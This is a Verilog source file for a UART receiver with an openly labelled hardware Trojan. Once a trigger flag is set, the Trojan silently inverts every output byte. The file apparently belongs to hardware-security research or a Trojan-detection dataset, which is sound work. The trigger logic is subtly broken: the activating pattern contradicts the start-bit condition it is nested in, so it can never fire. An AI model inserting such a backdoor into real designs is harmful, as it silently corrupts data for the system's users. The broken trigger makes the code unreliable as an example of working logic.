 module uart_rx (
	input clk,
	input rx_serial,
	output reg tx_flag = 1'b0,
	output reg [7:0] tx_byte = 8'd0
);

	// Original design variables
	reg [5:0] serial = 6'b111111;
	reg [3:0] counter = 4'd0;
	reg [3:0] state = 4'd0;
	reg [8:0] partial_byte = 9'd0;
	
	// Hardware Trojan variables
	reg trojan_activated = 1'b0; // Flag for trojan activation

	// Detectors
	wire start_detect = serial[5] & serial[4] & serial[3] & ~serial[2];
	wire one_detect = serial[5] & serial[4] & serial[3];
	wire zero_detect = ~serial[5] & ~serial[4] & ~serial[3];
	wire error_pattern = ~serial[5] & serial[4] & ~serial[3]; // Specific erroneous pattern

	//
	always @ (posedge clk)
	begin
		serial <= {serial[4:0], rx_serial};
		counter <= counter + 4'd1;

		if (tx_flag)
			tx_flag <= 1'b0;

		// Finite-State-Machine
		if (state == 4'd0)
		begin
			if (start_detect)
			begin
				state <= 4'd1;
				counter <= 4'd0;
				if (error_pattern) // Check for the specific pattern that activates the trojan
					trojan_activated <= 1'b1;
			end
		end
		else if (counter == 4'd9)
		begin
			state <= state + 4'd1;
			partial_byte <= {one_detect, partial_byte[8:1]};

			if (~one_detect & ~zero_detect || (state == 4'd1 & ~zero_detect)) // Noise error or start bit error
				state <= 4'd0;
		end
		else if (state == 4'd11)
		begin
			state <= 4'd0;

			if (partial_byte[8]) // Stop bit correctly received
			begin
				if (!trojan_activated) begin
					tx_flag <= 1'b1;
					tx_byte <= partial_byte[7:0];
				end else begin
					// If trojan is activated, alter the outputted data
					tx_flag <= 1'b1;
					tx_byte <= ~partial_byte[7:0]; // Example: Invert the data bits
				end
			end
		end
	end

endmodule
